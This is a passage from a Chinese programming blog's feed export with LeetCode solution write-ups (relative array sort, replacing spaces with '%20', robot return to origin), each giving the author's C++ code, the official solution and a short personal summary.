<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历数组arr2，对每一个元素在数组arr1中查找，若找到则添加到结果中并从arr1中删除。最后arr1中都是不在arr2中的元素，升序放在结果的末尾。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败22.04%，内存消耗8M，击败9.72%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">relativeSortArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr1, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr2)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="comment">//遍历arr2中的元素</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr2.size();++i)&#123;</span><br><span class="line">            <span class="comment">//在arr1中查找该元素</span></span><br><span class="line">            <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator it;</span><br><span class="line">            <span class="keyword">while</span>((it=find(arr1.begin(),arr1.end(),arr2[i]))!=arr1.end())&#123;</span><br><span class="line">                result.push_back(arr2[i]);</span><br><span class="line">                <span class="comment">//删除arr1中该元素，继续查找</span></span><br><span class="line">                arr1.erase(it);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//现在arr1中都是未在arr2中出现过的元素</span></span><br><span class="line">        <span class="comment">//升序排序</span></span><br><span class="line">        sort(arr1.begin(),arr1.end());</span><br><span class="line">        <span class="comment">//放在最后</span></span><br><span class="line">        result.insert(result.end(),arr1.begin(),arr1.end());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/relative-sort-array/solution/shu-zu-de-xiang-dui-pai-xu-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一：自定义排序</strong></p>
<p>一种容易想到的方法是使用排序并自定义比较函数。</p>
<p>由于数组 $\textit{arr}_2$  规定了比较顺序，因此我们可以使用哈希表对该顺序进行映射：即对于数组 $\textit{arr}_2$ 中的第 $i$ 个元素，我们将 $(\textit{arr}_2[i], i)$ 这一键值对放入哈希表 $\textit{rank}$中，就可以很方便地对数组 $\textit{arr}_1$中的元素进行比较。</p>
<p>比较函数的写法有很多种，例如我们可以使用最基础的比较方法，对于元素 $x$ 和$y$：</p>
<ul>
<li>如果 $x$ 和 $y$ 都出现在哈希表中，那么比较它们对应的值 $\textit{rank}[x]$和 $\textit{rank}[y]$；</li>
<li>如果 $x$ 和 $y$ 都没有出现在哈希表中，那么比较它们本身；</li>
<li>对于剩余的情况，出现在哈希表中的那个元素较小。</li>
</ul>
<p><strong>c++代码：</strong>(执行用时8ms，击败56.78%，内存消耗8M，击败9.16%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">relativeSortArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr1, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr2)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; rank;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr2.size(); ++i) &#123;</span><br><span class="line">            rank[arr2[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(arr1.begin(), arr1.end(), [&amp;](<span class="keyword">int</span> x, <span class="keyword">int</span> y) &#123;</span><br><span class="line">            <span class="keyword">if</span> (rank.count(x)) &#123;</span><br><span class="line">                <span class="keyword">return</span> rank.count(y) ? rank[x] &lt; rank[y] : <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> rank.count(y) ? <span class="literal">false</span> : x &lt; y;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> arr1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>很多语言支持对「元组」进行排序，即依次比较元组中每一个对应位置的元素，直到比较出大小关系为止。因此，对于元素 $x$，如果它出现在哈希表中，我们使用二元组 $(0, \textit{rank}[x])$；如果它没有出现在哈希表中，我们使用二元组 $(1, x)$，就可以得到正确的排序结果。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">relativeSortArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr1, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr2)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; rank;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr2.size(); ++i) &#123;</span><br><span class="line">            rank[arr2[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">auto</span> mycmp = [&amp;](<span class="keyword">int</span> x) -&gt; <span class="built_in">pair</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> rank.count(x) ? <span class="built_in">pair</span>&#123;<span class="number">0</span>, rank[x]&#125; : <span class="built_in">pair</span>&#123;<span class="number">1</span>, x&#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">        sort(arr1.begin(), arr1.end(), [&amp;](<span class="keyword">int</span> x, <span class="keyword">int</span> y) &#123;</span><br><span class="line">            <span class="keyword">return</span> mycmp(x) &lt; mycmp(y);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> arr1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>此外，由于题目中给定的元素都是正数，因此我们可以用 $\textit{rank}[x]-n$ 和 $x$分别代替 $(0, \textit{rank}[x])$ 和 $(1, x)$，其中 $n$ 是数组 $\textit{arr}_2$的长度（同时也是哈希表 $\textit{rank}$ 的大小）。这样做的正确性在于，$\textit{rank}[x]-n$一定是负数，而 $x$ 一定是正数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">relativeSortArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr1, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr2)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; rank;</span><br><span class="line">        <span class="keyword">int</span> n = arr2.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            rank[arr2[i]] = i - n;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(arr1.begin(), arr1.end(), [&amp;](<span class="keyword">int</span> x, <span class="keyword">int</span> y) &#123;</span><br><span class="line">            <span class="keyword">return</span> (rank.count(x) ? rank[x] : x) &lt; (rank.count(y) ? rank[y] : y);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> arr1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(m \log m + n)$，其中 $m$ 和 $n$ 分别是数组 $\textit{arr}_1$ 和 $\textit{arr}_2$ 的长度。构造哈希表 $\textit{rank}$ 的时间复杂度为 $O(n)$，排序的时间复杂度为 $O(m \log m)$。</p>
</li>
<li><p>空间复杂度：$O(\log m + n)$，哈希表 $\textit{rank}$需要的空间为 $O(n)$，排序需要的栈空间为 $O(\log m)$</p>
</li>
</ul>
<p><strong>方法二：计数排序</strong></p>
<p><strong>思路与算法</strong></p>
<p>注意到本题中元素的范围为 $[0, 1000]$，这个范围不是很大，我们也可以考虑不基于比较的排序，例如「计数排序」。</p>
<p>具体地，我们使用一个长度为 $1001$（下标从 $0$ 到 $1000$）的数组 $\textit{frequency}$，记录每一个元素在数组  中出现的次数。随后我们遍历数组 $\textit{arr}_2$ ，当遍历到元素 $x$ 时，我们将 $\textit{frequency}[x]$个 $x$ 加入答案中，并将 $\textit{frequency}[x]$清零。当遍历结束后，所有在 $\textit{arr}_2$中出现过的元素就已经有序了。</p>
<p>此时还剩下没有在 $\textit{arr}_2$中出现过的元素，因此我们还需要对整个数组 $\textit{frequency}$进行一次遍历。当遍历到元素 $x$时，如果 $\textit{frequency}[x]$不为 00，我们就将 $\textit{frequency}[x]$个 $x$加入答案中。</p>
<p><strong>细节</strong></p>
<p>我们可以对空间复杂度进行一个小优化。实际上，我们不需要使用长度为 $1001$ 的数组，而是可以找出数组 $\textit{arr}_1$ 中的最大值 $\textit{upper}$，使用长度为 $\textit{upper}+1$ 的数组即可。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗7.7M，击败51.63%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">relativeSortArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr1, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> upper = *max_element(arr1.begin(), arr1.end());</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">frequency</span><span class="params">(upper + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x: arr1) &#123;</span><br><span class="line">            ++frequency[x];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x: arr2) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; frequency[x]; ++i) &#123;</span><br><span class="line">                ans.push_back(x);</span><br><span class="line">            &#125;</span><br><span class="line">            frequency[x] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">0</span>; x &lt;= upper; ++x) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; frequency[x]; ++i) &#123;</span><br><span class="line">                ans.push_back(x);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(m + n + \textit{upper})$，其中 $m$ 和 $n$ 分别是数组 $\textit{arr}_1$ 和 $\textit{arr}_2$ 的长度，$\textit{upper}$是数组 $\textit{arr}_1$<br>中的最大值，在本题中 $\textit{upper}$不会超过 $1000$。遍历数组 $\textit{arr}_2$ 的时间复杂度为 $O(n)$，遍历数组 $\textit{frequency}$的时间复杂度为 $O(\textit{upper})$，而在遍历的过程中，我们一共需要 $O(m)$ 的时间得到答案数组。</li>
<li>空间复杂度：$O(\textit{upper})$，即为数组 $\textit{frequency}$ 需要使用的空间。注意到与方法一不同的是，方法二的代码使用了额外的空间（而不是直接覆盖数组 $\textit{arr}_1$ ）存放答案，但我们一般不将存储返回答案的数组计入空间复杂度，并且在我们得到数组 $\textit{frequency}$之后，实际上也是可以将返回答案覆盖在数组 $\textit{arr}_1$ 上的。如果在面试中遇到了本题，这些细节都可以和面试官进行确认。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>自定义排序容易想到吗？还是暴力解法比较香😎。可以学习自定义排序的思想，计数排序也遇到过好多次了，也是常用的解题方法。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>替换空格</title>
    <url>/2020/11/13/%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/ti-huan-kong-ge-lcof/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>请实现一个函数，把字符串 <code>s</code> 中的每个空格替换成”%20”。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;We are happy.&quot;</span><br><span class="line">输出：&quot;We%20are%20happy.&quot;</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<p><code>0 &lt;= s 的长度 &lt;= 10000</code></p>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历字符串，对每一个空格元素，使用string的成员函数replace进行子串替换。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.6M，击败7.61%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">replaceSpace</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();++i)&#123;</span><br><span class="line">            <span class="comment">//遍历字符串</span></span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                <span class="comment">//替换字符</span></span><br><span class="line">                s.replace(i,<span class="number">1</span>,<span class="string">&quot;%20&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/ti-huan-kong-ge-lcof/solution/mian-shi-ti-05-ti-huan-kong-ge-by-leetcode-solutio/">官方题解</a>:</h6><p><strong>方法一：字符数组</strong></p>
<p>由于每次替换从 1 个字符变成 3 个字符，使用字符数组可方便地进行替换。建立字符数组地长度为 s 的长度的 3 倍，这样可保证字符数组可以容纳所有替换后的字符。</p>
<p>获得 <code>s</code> 的长度 <code>length</code><br>创建字符数组 <code>array</code>，其长度为 <code>length * 3</code><br>初始化 <code>size</code> 为 <code>0</code>，<code>size</code> 表示替换后的字符串的长度<br>从左到右遍历字符串 <code>s</code><br>获得 <code>s</code> 的当前字符 <code>c</code><br>如果字符 <code>c</code> 是空格，则令 <code>array[size] = &#39;%&#39;</code>，<code>array[size + 1] = &#39;2&#39;</code>，<code>array[size + 2] = &#39;0&#39;</code>，并将 <code>size</code> 的值加 3<br>如果字符 <code>c</code> 不是空格，则令 <code>array[size] = c</code>，并将 <code>size</code> 的值加 1<br>遍历结束之后，<code>size</code> 的值等于替换后的字符串的长度，从 <code>array</code> 的前 <code>size</code> 个字符创建新字符串，并返回新字符串</p>
<p><strong>Java代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">replaceSpace</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = s.length();</span><br><span class="line">        <span class="keyword">char</span>[] array = <span class="keyword">new</span> <span class="keyword">char</span>[length * <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = s.charAt(i);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                array[size++] = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">                array[size++] = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">                array[size++] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                array[size++] = c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        String newStr = <span class="keyword">new</span> String(array, <span class="number">0</span>, size);</span><br><span class="line">        <span class="keyword">return</span> newStr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂性分析</strong></p>
<ul>
<li>时间复杂度：$O(n)$。遍历字符串 <code>s</code> 一遍。</li>
<li>空间复杂度：$O(n)$。额外创建字符数组，长度为 <code>s</code> 的长度的 3 倍。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解是使用Java实现的（用Java干嘛呀😑），道不同不相为谋，借鉴思想就完事了。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>机器人能否返回原点</title>
    <url>/2020/11/13/%E6%9C%BA%E5%99%A8%E4%BA%BA%E8%83%BD%E5%90%A6%E8%BF%94%E5%9B%9E%E5%8E%9F%E7%82%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/robot-return-to-origin/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>在二维平面上，有一个机器人从原点 (0, 0) 开始。给出它的移动顺序，判断这个机器人在完成移动后是否在 (0, 0) 处结束。</p>
<p>移动顺序由字符串表示。字符 move[i] 表示其第 i 次移动。机器人的有效动作有 <code>R</code>（右），<code>L</code>（左），<code>U</code>（上）和 <code>D</code>（下）。如果机器人在完成所有动作后返回原点，则返回 true。否则，返回 false。</p>
<p>注意：机器人“面朝”的方向无关紧要。 “R” 将始终使机器人向右移动一次，“L” 将始终向左移动等。此外，假设每次移动机器人的移动幅度相同。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;UD&quot;</span><br><span class="line">输出: true</span><br><span class="line">解释：机器人向上移动一次，然后向下移动一次。所有动作都具有相同的幅度，因此它最终回到它开始的原点。因此，我们返回 true。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;LL&quot;</span><br><span class="line">输出: false</span><br><span class="line">解释：机器人向左移动两次。它最终位于原点的左侧，距原点有两次 “移动” 的距离。我们返回 false，因为它在移动结束时没有返回原点。</span><br></pre></td></tr></table></figure>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>直接模拟就好了，用(x,y)坐标表示，遍历字符串，如果是R字符则x加1，U表示y加1，最后判断x和y是否是0就可以了。</p>
<p><strong>c++代码：</strong>(执行用时16ms，击败82.98%，内存消耗8.1M，击败16.74%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">judgeCircle</span><span class="params">(<span class="built_in">string</span> moves)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x=<span class="number">0</span>,y=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;moves.length();++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(moves[i]==<span class="string">&#x27;R&#x27;</span>)&#123;</span><br><span class="line">                ++x;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(moves[i]==<span class="string">&#x27;L&#x27;</span>)&#123;</span><br><span class="line">                --x;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(moves[i]==<span class="string">&#x27;U&#x27;</span>)&#123;</span><br><span class="line">                ++y;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(moves[i]==<span class="string">&#x27;D&#x27;</span>)&#123;</span><br><span class="line">                --y;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(x==<span class="number">0</span> &amp;&amp; y==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/robot-return-to-origin/solution/ji-qi-ren-neng-fou-fan-hui-yuan-dian-by-leetcode-s/">官方题解</a>:</h6><p><strong>方法一： 模拟</strong></p>
<p><strong>思路与算法</strong></p>
<p>我们只需按指令模拟机器人移动的坐标即可。起始时机器人的坐标为 $(0,0)$，在遍历完所有指令并对机器人进行移动之后，判断机器人的坐标是否为 $(0,0)$ 即可。</p>
<p>具体来说，我们用两个变量 xx 和 yy 来表示机器人当前所在的坐标为 $(x,y)$，起始时 $x=0$，$y=0$。接下来我们遍历指令并更新机器人的坐标：</p>
<p>如果指令是 $U$，则令 $y=y-1$<br>如果指令是 $D$，则令 $y=y+1$<br>如果指令是 $L$，则令 $x=x-1$<br>如果指令是 $R$，则令 $x=x+1$<br>最后判断 $(x,y)$ 是否为 $(0,0)$即可。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败97.42%，内存消耗8.3M，击败5.04%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">judgeCircle</span><span class="params">(<span class="built_in">string</span> moves)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; move: moves) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move == <span class="string">&#x27;U&#x27;</span>) &#123;</span><br><span class="line">                y--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (move == <span class="string">&#x27;D&#x27;</span>) &#123;</span><br><span class="line">                y++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (move == <span class="string">&#x27;L&#x27;</span>) &#123;</span><br><span class="line">                x--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (move == <span class="string">&#x27;R&#x27;</span>) &#123;</span><br><span class="line">                x++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x == <span class="number">0</span> &amp;&amp; y == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度： $O(N)$，其中 $N$ 表示 $\textit{moves}$ 指令串的长度。我们只需要遍历一遍字符串即可。</p>
</li>
<li><p>空间复杂度： $O(1)$。我们只需要常数的空间来存放若干变量。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解和我的思路一样，不过有值得学习的地方。第一点可以改用增强for循环，第二点return返回时使用逻辑表达式，不像我用了if判断😆，题目还比较简单。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>查找常用字符</title>
    <url>/2020/11/13/%E6%9F%A5%E6%89%BE%E5%B8%B8%E7%94%A8%E5%AD%97%E7%AC%A6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/flipping-an-image/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
